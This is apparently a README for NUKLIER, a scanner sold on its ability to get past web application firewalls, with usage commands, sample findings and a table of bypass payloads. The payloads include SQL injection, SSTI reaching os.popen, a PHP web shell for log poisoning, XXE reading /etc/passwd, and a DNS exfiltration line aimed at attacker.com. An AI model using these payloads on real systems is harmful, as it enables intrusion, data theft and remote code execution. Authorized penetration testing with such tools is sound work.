# Nuklier
Scanner Zero-Day

markdown
# ☢️ NUKLIER v6.0

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&pause=1000&color=00FF00&center=true&vCenter=true&random=false&width=600&height=100&lines=WAF+Bypass+Scanner;500%2B+Payloads;15%2B+Bypass+Techniques;Death+System" alt="Typing SVG" />
</p>

<p align="center">
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/Python-3.8%2B-00ff00?style=for-the-badge&logo=python&logoColor=white&color=0a0a0a" />
  </a>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-00ff00?style=for-the-badge&logo=opensourceinitiative&logoColor=white&color=0a0a0a" />
  </a>
  <a href="https://github.com/yourusername/nuklier">
    <img src="https://img.shields.io/badge/Version-6.0-00ff00?style=for-the-badge&logo=github&logoColor=white&color=0a0a0a" />
  </a>
</p>

---

<p align="center">
  <img src="https://raw.githubusercontent.com/yourusername/nuklier/main/assets/demo.gif" alt="demo" width="800"/>
</p>

bash
███╗   ██╗██╗   ██╗██╗  ██╗██╗     ██╗███████╗██████╗ 
████╗  ██║██║   ██║██║ ██╔╝██║     ██║██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ ██║     ██║█████╗  ██████╔╝
██║╚██╗██║██║   ██║██╔═██╗ ██║     ██║██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║███████╗██║  ██║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝


<p align="center">
  <b>ULTIMATE WAF Bypass Scanner | 500+ Payloads | 15+ Bypass Techniques</b><br>
  <i>by b4ow | @B4owBit_bot | Death System</i>
</p>

---

⚠️ DISCLAIMER

diff
- THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.
- Only use on systems you own or have explicit permission to test.
- Unauthorized access is illegal and unethical.
- The author assumes no responsibility for misuse.


---

✨ FEATURES

🚀 Category 📝 Details
15 Bypass Techniques Double encoding · SQL comments · Case mutation · Chunked transfer · DNS OOB · JSONP/CORS · GraphQL introspection · JWT alg none · SSTI chaining · Header injection · Log poisoning · XXE via SVG · SSRF parser bypass · Parameter pollution · TRACE method
500+ Payloads Comprehensive collection of WAF bypass payloads
8 Vulnerability Types SQLi · XSS · LFI · RCE · SSRF · SSTI · XXE · JWT
WAF Detection Cloudflare · AWS WAF · ModSecurity · Sucuri · Imperva · Akamai · F5 · Fortinet
CSRF Handling Automatic CSRF token extraction for POST forms
Parameter Fuzzing Automatic parameter discovery (50+ common params)
DNS OOB Blind injection detection via DNS callbacks
HTML & JSON Reports Detailed findings with remediation suggestions
Async Architecture High performance with 30+ concurrent threads
Rate Limiting Smart delays to avoid blocking

---

🚀 INSTALLATION

bash
# Clone the repository
git clone https://github.com/b4ow/nuklier.git
cd nuklier

# Install dependencies
pip install -r requirements.txt


📦 Dependencies

txt
aiohttp>=3.8.0   # Async HTTP requests
dnspython>=2.3.0 # DNS OOB detection


---

📖 USAGE

Basic Scan

bash
python nuklier.py http://target.com/page.php?id=1


Full Options

bash
python nuklier.py http://target.com/page.php?id=1 \
    --threads 50 \
    --timeout 8 \
    --cookie "PHPSESSID=abc123" \
    --proxy http://127.0.0.1:8080 \
    --dns your-callback.com


Help

bash
python nuklier.py -h


---

🎯 EXAMPLES

bash
# Scan with session cookie
python nuklier.py http://target.com/dashboard.php --cookie "session=xyz789"

# Route through Burp Suite
python nuklier.py http://target.com/page.php?id=1 --proxy http://127.0.0.1:8080

# Custom DNS callback for blind injection
python nuklier.py http://target.com/page.php?id=1 --dns collaborator.burp.net

# High speed (more likely to trigger WAF)
python nuklier.py http://target.com/page.php?id=1 --threads 50 --timeout 5

# Stealth mode (slow but safe)
python nuklier.py http://target.com/page.php?id=1 --threads 10 --timeout 15


---

📊 OUTPUT

Terminal

```
[*] Target: http://target.com/page.php?id=1
[*] DNS Callback: oast.b4ow.com
[*] Detecting WAF...
[!] WAF Detected: Cloudflare
[*] Fuzzing parameters...
[+] Found parameter: id
[*] Loaded 486 advanced bypass payloads
[*] Starting 15234 advanced bypass tests...

[CRITICAL] SQLi | http://target.com/page.php?id=1' OR 1=1--
[HIGH] SSRF Bypass | http://target.com/page.php?url=http://169.254.169.254/
[CRITICAL] RCE | http://target.com/page.php?cmd=; whoami

[*] Scan completed!
[*] Advanced findings: 3
[*] HTML Report: nuklier_report.html
[*] JSON: nuklier_a1b2c3d4.json
```

Reports

· nuklier_report.html — Interactive HTML report with severity colors
· nuklier_xxxx.json — JSON format for automation

---

🛡️ BYPASS TECHNIQUE

# Technique Description Example
1 Double Encoding URL encode twice to bypass WAFs that decode only once %2527%2520%254F%2552
2 SQL Comments MySQL-specific comments bypass regex filters /*!50000UNION*/ SELECT
3 Case Mutation Random case bypass case-sensitive filters UnIoN SeLeCt
4 Chunked Transfer Split payload across HTTP chunks Transfer-Encoding: chunked
5 DNS OOB Blind injection detection via DNS queries load_file(concat('\\\\',version(),'.attacker.com'))
6 JSONP Injection Callback parameter abuse callback=alert(1)
7 GraphQL Introspection Dump GraphQL schema {__schema{types{name}}}
8 JWT Alg None Bypass signature verification alg: none
9 SSTI Chaining Template injection to RCE {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
10 Header Injection CRLF injection in HTTP headers User-Agent: '><script>alert(1)</script>
11 Log Poisoning Inject PHP code into server logs <?php system($_GET['cmd']); ?>
12 XXE via SVG XML external entity via SVG upload <!ENTITY xxe SYSTEM "file:///etc/passwd">
13 SSRF Parser Bypass IPv4/IPv6 variations to bypass filters 0.0.0.0, [::], 2130706433
14 Parameter Pollution Duplicate parameters confuse WAF ?id=1&id=1' OR '1'='1
15 TRACE Method XSS via custom HTTP headers TRACE / HTTP/1.1



---

⚙️ PERFORMANCE

Metric Value
Threads 30 concurrent (adjustable)
Timeout 10 seconds default
Rate Limiting 0.2-0.5s delay between requests
Memory Usage ~50MB RAM
Scan Time 20-40 minutes for 500+ payloads
Requests/Second 30-50 with default settings

---

🔧 TROUBLESHOOTING

DNS OOB Not Working

bash
pip install dnspython


Connection Timeouts

bash
pythonnuklier.py http://target.com --timeout 15 --threads 15


WAF Blocks Your IP

bash
# Use proxy
python nuklier.py http://target.com --proxy http://proxy1.com

# Slow down
python nuklier.py http://target.com --threads 10 --timeout 15


---

🤝 CONTRIBUTING

1. Fork the repository
2. Create feature branch (git checkout -b feature/amazing-feature)
3. Commit changes (git commit -m 'Add amazing feature')
4. Push to branch (git push origin feature/amazing-feature)
5. Open Pull Request

---

📝 LICENSE

MIT License — See LICENSE file

```
Copyright (c) 2024 b4ow
```

---

👤 AUTHOR

b4ow — Security Researcher & Developer

```json
{
  "name": "b4ow",
  "alias": "Death System",
  "telegram": "@b-4ow",
  "tools": ["NUKLIER"],
  "motto": "Building weapons, not toys"
}
```

---

⭐ STAR HISTORY

If you find this tool useful, consider giving it a star ⭐

---

<p align="center">
  <b>⚠️ Remember: With great power comes great responsibility. Use this tool ethically and legally.</b><br>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=14&duration=3000&pause=1000&color=00FF00&center=true&vCenter=true&width=500&height=30&lines=Made+with+%E2%9D%A4%EF%B8%8F+by+b4ow;Death+System+%7C+%40B4owBit_bot" />
</p>
